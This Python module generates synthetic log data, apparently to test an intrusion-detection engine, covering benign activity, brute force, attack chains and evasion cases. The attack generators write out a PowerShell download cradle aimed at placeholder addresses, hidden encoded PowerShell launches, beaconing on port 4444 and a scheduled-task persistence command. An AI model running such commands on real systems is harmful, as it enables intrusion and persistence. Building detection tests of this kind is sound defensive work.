"""Randomized generators for the detection evaluation.

Everything here is synthetic and safe: external addresses come from the reserved
documentation ranges (198.51.100.0/24, 203.0.113.0/24), and the encoded PowerShell payload
decodes to a harmless print statement.

Design rule: the generators were written *before* looking at detection results and are not
tuned to make the engine look good. They model plausible behavior, including behavior that
is genuinely ambiguous (see `tricky_benign_day`), because a false-positive rate measured
only on trivially clean data would be meaningless.

Every generator returns rows as dicts. The evaluation writes them to CSV in the order
given (deliberately NOT sorted by time, like a real unsorted log export), so a row's
position determines its event ID (EVT-000001 is the first data row).
"""
from __future__ import annotations

import base64
import hashlib
import random
from datetime import datetime, timedelta

FIELDS = [
    "timestamp", "username", "source_ip", "destination_ip", "destination_port",
    "event_type", "action", "status", "hostname", "process", "command_line",
    "file_hash", "message",
]

DAY = datetime(2026, 9, 14)
ENCODED = base64.b64encode("Write-Output 'simulated benign payload'".encode("utf-16-le")).decode()
FAKE_HASH = hashlib.sha256(b"simulated-payload.exe").hexdigest()

WEB_IPS = ["142.250.183.14", "151.101.1.69", "104.16.132.229", "13.107.42.14"]
BENIGN_POWERSHELL = [
    "powershell.exe Get-Process | Sort-Object CPU -Descending | Select -First 10",
    "powershell.exe Get-Service | Where-Object Status -eq Running",
    "powershell.exe Get-ChildItem C:\\Logs -Recurse",
    "powershell.exe Get-EventLog -LogName Application -Newest 50",
    "powershell.exe Test-Connection intranet.corp -Count 2",
]
BENIGN_PROCESSES = ["chrome.exe", "outlook.exe", "teams.exe", "excel.exe", "winword.exe", "code.exe"]
# Tokens for benign "regular" service accounts and staff names
STAFF = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy",
         "ken", "laura", "mallory", "nina", "oscar"]
ATTACK_TARGETS = ["admin", "root", "svc_backup", "administrator", "jsmith"]


def row(ts, user, src, dst, etype, action, status, host,
        process="", cmd="", fhash="", msg="", port=""):
    return {
        "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"), "username": user, "source_ip": src,
        "destination_ip": dst, "destination_port": port, "event_type": etype, "action": action,
        "status": status, "hostname": host, "process": process, "command_line": cmd,
        "file_hash": fhash, "message": msg,
    }


def at(hour, minute=0, second=0):
    return DAY.replace(hour=hour, minute=minute, second=second)


def _rand_time(rng, start_hour, end_hour):
    """A random moment between two (possibly fractional) hours of the day."""
    return DAY + timedelta(seconds=rng.randint(int(start_hour * 3600), int(end_hour * 3600) - 1))


def _external_ip(rng):
    return rng.choice([f"198.51.100.{rng.randint(1, 254)}", f"203.0.113.{rng.randint(1, 254)}"])


# --------------------------------------------------------------------------
# Background activity
# --------------------------------------------------------------------------
def normal_day(rng: random.Random) -> list[dict]:
    """An ordinary working day. Includes the kinds of noise that shouldn't alarm anyone:
    mistyped passwords (up to 8 in a row - deliberately close to, but under, the
    brute-force threshold), a remote worker logging in from an external IP during business
    hours, an occasional after-hours login from the user's own machine, browsing, and benign
    PowerShell one-liners."""
    rows = []
    for user in rng.sample(STAFF, rng.randint(4, 12)):
        ip = f"10.0.1.{rng.randint(10, 250)}"
        host = f"WS-{user.upper()}"
        t = _rand_time(rng, 7.5, 10)

        remote = rng.random() < 0.06
        login_ip = _external_ip(rng) if remote else ip

        # Either a few ordinary typos, or (rarely) a longer struggle after a holiday - never
        # both, so consecutive failures stay at or below 8, under the brute-force threshold.
        r_fail = rng.random()
        if r_fail < 0.08:                             # forgot password after a holiday
            for _ in range(rng.randint(5, 8)):
                rows.append(row(t, user, login_ip, "10.0.0.10", "LOGIN", "authentication", "FAILED",
                                "SRV-APP01", msg="Invalid credentials"))
                t += timedelta(seconds=rng.randint(4, 20))
        elif r_fail < 0.43:                           # ordinary typos
            for _ in range(rng.randint(1, 3)):
                rows.append(row(t, user, login_ip, "10.0.0.10", "LOGIN", "authentication", "FAILED",
                                "SRV-APP01", msg="Invalid credentials"))
                t += timedelta(seconds=rng.randint(5, 60))
        rows.append(row(t, user, login_ip, "10.0.0.10", "LOGIN", "authentication", "SUCCESS",
                        "SRV-APP01", msg="Interactive logon"))

        for _ in range(rng.randint(8, 25)):
            t += timedelta(minutes=rng.randint(2, 30))
            r = rng.random()
            if r < 0.6:
                proc = rng.choice(BENIGN_PROCESSES)
                rows.append(row(t, user, ip, "", "PROCESS", "process_start", "EXECUTED", host,
                                process=proc, msg=f"{proc} started"))
            elif r < 0.85:
                rows.append(row(t, user, ip, rng.choice(WEB_IPS), "NETWORK", "connection", "ALLOWED",
                                host, process="chrome.exe", msg="Outbound HTTPS", port="443"))
            else:
                rows.append(row(t, user, ip, "", "PROCESS", "process_start", "EXECUTED", host,
                                process="powershell.exe", cmd=rng.choice(BENIGN_POWERSHELL),
                                msg="Interactive PowerShell"))
        if rng.random() < 0.05:                       # after-hours login from own machine
            late = at(rng.choice([20, 21, 22]), rng.randint(0, 59))
            rows.append(row(late, user, ip, "10.0.0.10", "LOGIN", "authentication", "SUCCESS",
                            "SRV-APP01", msg="Interactive logon"))
    return rows


def tricky_benign_day(rng: random.Random) -> list[dict]:
    """A normal day PLUS legitimate IT-admin activity that superficially resembles attacker
    behavior. Each behavior below is something a real administrator does routinely, and none
    is an attack. Whether the engine flags them is exactly what this measures - a scheduled
    task or service install is only "suspicious" given context the rules may not have."""
    rows = normal_day(rng)
    admin, ip = "sysadmin", "10.0.0.99"
    t = _rand_time(rng, 9, 16)
    rows.append(row(t, admin, ip, "10.0.0.10", "LOGIN", "authentication", "SUCCESS", "SRV-APP01",
                    msg="Interactive logon"))

    behaviors = ["scheduled_script", "install_service", "schedule_task", "module_download",
                 "multi_host_discovery"]
    for behavior in rng.sample(behaviors, rng.randint(1, 3)):
        t += timedelta(minutes=rng.randint(3, 25))
        if behavior == "scheduled_script":           # extremely common in legitimate automation
            rows.append(row(t, admin, ip, "", "PROCESS", "process_start", "EXECUTED", "SRV-APP01",
                            process="powershell.exe",
                            cmd="powershell.exe -NoProfile -ExecutionPolicy Bypass "
                                "-File C:\\Scripts\\nightly_backup.ps1",
                            msg="Scheduled task launched script"))
        elif behavior == "install_service":          # IT deploying an agent
            rows.append(row(t, admin, ip, "", "PROCESS", "process_start", "EXECUTED", "SRV-APP01",
                            process="sc.exe",
                            cmd='sc.exe create MonitoringAgent binPath= "C:\\Program Files\\Agent\\agent.exe"',
                            msg="Service installed"))
        elif behavior == "schedule_task":            # legitimate backup job
            rows.append(row(t, admin, ip, "", "PROCESS", "process_start", "EXECUTED", "SRV-APP01",
                            process="schtasks.exe",
                            cmd='schtasks /create /sc daily /tn NightlyBackup '
                                '/tr "C:\\Program Files\\Backup\\backup.exe" /st 02:00',
                            msg="Scheduled task created"))
        elif behavior == "module_download":          # Install-Module reaches the PowerShell Gallery
            rows.append(row(t, admin, ip, rng.choice(WEB_IPS), "NETWORK", "connection", "ALLOWED",
                            "SRV-APP01", process="powershell.exe",
                            msg="Outbound HTTPS to package repository", port="443"))
        else:                                         # routine checks on a couple of servers
            for host in rng.sample(["SRV-APP01", "SRV-DC01", "SRV-FILE01"], 2):
                rows.append(row(t, admin, ip, "", "PROCESS", "process_start", "EXECUTED", host,
                                process="cmd.exe", cmd="cmd.exe /c ipconfig /all",
                                msg="Routine network check"))
                t += timedelta(minutes=rng.randint(1, 10))
    return rows


# --------------------------------------------------------------------------
# Attack scenarios. Each returns (rows, expected_incident_type). Parameters are randomized.
# --------------------------------------------------------------------------
def _failures(rng, start, n, src, user, host, gap_range):
    rows, t = [], start
    for _ in range(n):
        rows.append(row(t, user, src, "10.0.0.20", "LOGIN", "authentication", "FAILED", host,
                        msg="Invalid credentials"))
        t += timedelta(seconds=rng.uniform(*gap_range))
    return rows, t


def attack_brute_force(rng):
    src = rng.choice([_external_ip(rng), f"192.168.1.{rng.randint(2, 250)}"])
    user = rng.choice(ATTACK_TARGETS)
    rows, t = _failures(rng, _rand_time(rng, 10, 15), rng.randint(12, 80), src, user,
                        "SRV-FILE01", (1, 15))
    if rng.random() < 0.5:                            # sometimes the guess succeeds, nothing follows
        rows.append(row(t + timedelta(seconds=rng.randint(10, 120)), user, src, "10.0.0.20",
                        "LOGIN", "authentication", "SUCCESS", "SRV-FILE01",
                        msg="Interactive logon"))
    return rows, "brute_force"


def attack_powershell(rng):
    user = rng.choice(STAFF)
    host, ip = f"WS-{user.upper()}", f"10.0.1.{rng.randint(10, 250)}"
    t = _rand_time(rng, 10, 16)
    techniques = rng.sample(["encoded", "cradle", "office"], rng.randint(1, 3))
    rows = []
    cmd = "powershell.exe -NoProfile"
    msg = "Spawned by user session"
    if "encoded" in techniques:
        cmd += f" -EncodedCommand {ENCODED}"
    if "cradle" in techniques:
        c2 = _external_ip(rng)
        cmd += f" -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{c2}/a.ps1')\""
    if "office" in techniques:
        msg = "Parent process: winword.exe"
    if techniques == ["office"]:
        cmd = "powershell.exe Get-Date"              # Office parent alone is the only signal
    rows.append(row(t, user, ip, "", "PROCESS", "process_start", "EXECUTED", host,
                    process="powershell.exe", cmd=cmd, msg=msg))
    if rng.random() < 0.6:                            # often calls out afterwards
        rows.append(row(t + timedelta(seconds=rng.randint(5, 90)), user, ip, _external_ip(rng),
                        "NETWORK", "connection", "ALLOWED", host, process="powershell.exe",
                        msg="Outbound HTTP", port=str(rng.choice([80, 443, 8080]))))
    return rows, "suspicious_powershell"


def attack_auth_endpoint(rng):
    user = rng.choice(STAFF + ["admin"])
    src = _external_ip(rng)
    t = at(rng.choice([0, 1, 2, 3, 4, 5, 22, 23]), rng.randint(0, 59))
    rows = [row(t, user, src, "10.0.0.10", "LOGIN", "authentication", "SUCCESS", "SRV-APP01",
                msg="Interactive logon from previously unseen source")]
    commands = rng.sample(["whoami /all", "net user", "ipconfig /all", "systeminfo", "net group"],
                          rng.randint(1, 4))
    for cmd in commands:
        t += timedelta(seconds=rng.randint(30, 300))
        rows.append(row(t, user, src, "", "PROCESS", "process_start", "EXECUTED", "SRV-APP01",
                        process="cmd.exe", cmd=f"cmd.exe /c {cmd}", msg="Command executed"))
    return rows, "suspicious_authentication"


def attack_chain(rng):
    src = f"192.168.1.{rng.randint(2, 250)}"
    user = rng.choice(["admin", "administrator", "root"])
    host = "SRV-APP01"
    rows, t = _failures(rng, _rand_time(rng, 10, 15), rng.randint(15, 60), src, user, host, (2, 12))
    t += timedelta(seconds=rng.randint(10, 90))
    rows.append(row(t, user, src, "10.0.0.10", "LOGIN", "authentication", "SUCCESS", host,
                    msg="Logon after repeated failures"))
    t += timedelta(minutes=rng.randint(1, 4))
    rows.append(row(t, user, src, "", "PROCESS", "process_start", "EXECUTED", host,
                    process="powershell.exe", cmd=f"powershell.exe -nop -w hidden -enc {ENCODED}",
                    msg="Encoded PowerShell"))
    t += timedelta(seconds=rng.randint(30, 200))
    rows.append(row(t, user, src, "", "PROCESS", "process_start", "EXECUTED", host,
                    process="cmd.exe", cmd="cmd.exe /c whoami /all", msg="Discovery"))
    c2, port = _external_ip(rng), rng.choice([4444, 4444, 8080])
    interval = rng.randint(30, 90)
    for _ in range(rng.randint(3, 8)):
        t += timedelta(seconds=interval)
        rows.append(row(t, user, src, c2, "NETWORK", "connection", "ALLOWED", host,
                        process="powershell.exe", msg="Outbound connection", port=str(port)))
    t += timedelta(seconds=rng.randint(20, 120))
    rows.append(row(t, user, src, "", "PROCESS", "process_start", "EXECUTED", host,
                    process="schtasks.exe",
                    cmd="schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\Public\\u.exe",
                    msg="Scheduled task created"))
    return rows, "attack_chain"


ATTACKS = {
    "brute_force": attack_brute_force,
    "suspicious_powershell": attack_powershell,
    "suspicious_authentication": attack_auth_endpoint,
    "attack_chain": attack_chain,
}


# --------------------------------------------------------------------------
# Evasion cases: attacks the engine is NOT designed to catch. Deterministic on purpose -
# they document known limitations rather than measure a rate.
# --------------------------------------------------------------------------
def evasion_low_and_slow():
    """30 failed logins, one every 90 seconds: never 10 within any 10-minute window."""
    rng, src = random.Random(0), "198.51.100.9"
    rows, _ = _failures(rng, at(11), 30, src, "admin", "SRV-FILE01", (90, 90))
    return rows


def evasion_distributed():
    """20 different IPs, 3 failed logins each against one account: no single IP crosses the
    per-IP threshold even though the account sees 60 failures."""
    rows, t = [], at(11)
    for i in range(20):
        for _ in range(3):
            rows.append(row(t, "admin", f"198.51.100.{i + 1}", "10.0.0.20", "LOGIN", "authentication",
                            "FAILED", "SRV-FILE01", msg="Invalid credentials"))
            t += timedelta(seconds=5)
    return rows


def evasion_beacon_standard_port():
    """A custom (non-scripting) process beaconing over port 443: outside the outbound rule's
    scope, which looks only at scripting engines and known-bad ports."""
    rows, t = [], at(14)
    for _ in range(8):
        rows.append(row(t, "carol", "10.0.1.23", "198.51.100.50", "NETWORK", "connection", "ALLOWED",
                        "WS-CAROL", process="updater.exe", msg="Outbound HTTPS", port="443"))
        t += timedelta(seconds=60)
    return rows


def spray_positive():
    """Password spraying: one IP, 25 different accounts, 1-2 failures each within minutes.
    The per-IP rule aggregates across accounts, so this SHOULD be detected."""
    rng, rows, t = random.Random(0), [], at(11)
    for user in [f"user{i:02d}" for i in range(25)]:
        for _ in range(rng.randint(1, 2)):
            rows.append(row(t, user, "198.51.100.77", "10.0.0.20", "LOGIN", "authentication", "FAILED",
                            "SRV-APP01", msg="Invalid credentials"))
            t += timedelta(seconds=rng.randint(2, 6))
    return rows


def threshold_sweep_rows(n_failures: int, gap_seconds: int = 5):
    rows, t = [], at(11)
    for _ in range(n_failures):
        rows.append(row(t, "admin", "198.51.100.9", "10.0.0.20", "LOGIN", "authentication", "FAILED",
                        "SRV-FILE01", msg="Invalid credentials"))
        t += timedelta(seconds=gap_seconds)
    return rows


def locked_out_legitimate_user():
    """A real user locked out after 12 attempts from their OWN workstation, then succeeding.
    Indistinguishable from a brute force that worked, using only the fields in the log -
    documented as an inherent ambiguity, not a bug the rules can fix without extra context."""
    rows, t = [], at(9, 30)
    for _ in range(12):
        rows.append(row(t, "alice", "10.0.1.21", "10.0.0.10", "LOGIN", "authentication", "FAILED",
                        "SRV-APP01", msg="Invalid credentials"))
        t += timedelta(seconds=8)
    rows.append(row(t, "alice", "10.0.1.21", "10.0.0.10", "LOGIN", "authentication", "SUCCESS",
                    "SRV-APP01", msg="Interactive logon"))
    return rows
